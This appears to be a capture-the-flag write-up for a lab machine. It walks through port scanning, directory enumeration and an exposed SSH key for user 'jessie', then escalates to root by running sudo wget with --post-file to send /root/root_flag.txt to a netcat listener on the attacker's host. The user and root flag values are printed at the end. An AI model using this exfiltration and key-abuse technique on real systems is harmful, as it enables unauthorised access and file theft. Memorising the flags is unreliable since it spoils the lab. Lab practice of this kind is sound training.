<pre>
Machine IP: 10.10.61.228

Enum:
    Open ports:
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8| ssh-hostkey:
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works


Enum port 80: gobuster
    /sitemap
        /images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
.ssh -> ssh key
            Find username at : view-source:http://10.10.61.228/
                jessie

Login via ssh:
 $ ssh -i id_rsa jessie@10.10.61.228 -p 22
        At documents we will find user_flag.txt


Priv Esc:
    $ sudo -l

    And we will see 
$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
    Lets exploit!

    Attacking machine:
$ nc -lvnp 80 > root.txt
CTF machine:
    sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.8.129.79

    And got root flag



User Flag: 057c67131c3d5e42dd5cd3075b198ff6
Root Flag: b1b968b37519ad1daa6408188649263d
</pre>
